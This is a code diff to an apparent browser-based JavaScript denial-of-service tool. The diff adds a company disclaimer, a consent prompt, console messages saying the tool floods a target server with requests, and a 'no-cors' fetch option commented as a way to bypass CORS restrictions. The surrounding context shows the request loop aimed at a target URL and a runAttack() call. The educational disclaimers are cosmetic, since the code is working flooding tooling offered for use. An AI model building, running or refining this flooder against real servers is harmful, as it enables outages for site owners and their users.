@@ -1,9 +1,15 @@
 // +---------------------------------------------------------------------------+
  // |  DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL/RESEARCH PURPOSES ONLY.        |
- // |  DO NOT USE IT FOR MALICIOUS ACTIVITIES. I AM NOT RESPONSIBLE             |
+ // |  DO NOT USE IT FOR MALICIOUS ACTIVITIES. Noodles Inc. IS NOT RESPONSIBLE |
  // |  FOR ANY DAMAGE CAUSED BY THE MISUSE OF THIS TOOL.                         |
- // |  USE AT YOUR OWN RISK.                                                     |
+ // |  UNAUTHORIZED USE IS ILLEGAL. USE AT YOUR OWN RISK.                       |
  // +---------------------------------------------------------------------------+
+ 
+
+ // Initial User Consent
+ if (!confirm("WARNING: This tool is for educational purposes ONLY. Unauthorized use is illegal. Do you understand and agree to use this tool responsibly?")) {
+  window.close();
+ }
  
 
  // Configuration
@@ -28,6 +34,7 @@
   try {
   const response = await fetch(targetURL, {
   method: 'GET', // Or 'POST', depending on the target
+  mode: 'no-cors' // Try this to bypass CORS for basic requests - will need a proxy for anything complex.
   // Add headers, body, etc. for more sophisticated attacks
   });
  
@@ -64,3 +71,19 @@
  
 
  runAttack();
+ 
+
+ // Educational Information (Basic Example)
+ log("%cDDOS Tool Information:\nThis tool is a basic demonstration of a Denial-of-Service (DoS) attack. It floods the target server with requests to overwhelm it. Using high number of threads may result in damage and/or legal issues. Use at your own risk.", 'color: orange');
+ 
+
+ // Disclaimer
+ log("%cNoodles Inc. Disclaimer: Unauthorized use of this tool is illegal. Noodles Inc. is NOT responsible for any misuse or damage caused by this tool.", 'color: red');
+ 
+
+ // Security Headers (Example - Needs proper implementation)
+ log("%cSetting security headers... (This is a placeholder, implement real headers!)", 'color: darkblue');
+ 
+
+ // Reporting Feature (Placeholder)
+ log("%cReporting feature: To be implemented. Use console logs for now.", 'color: darkblue');
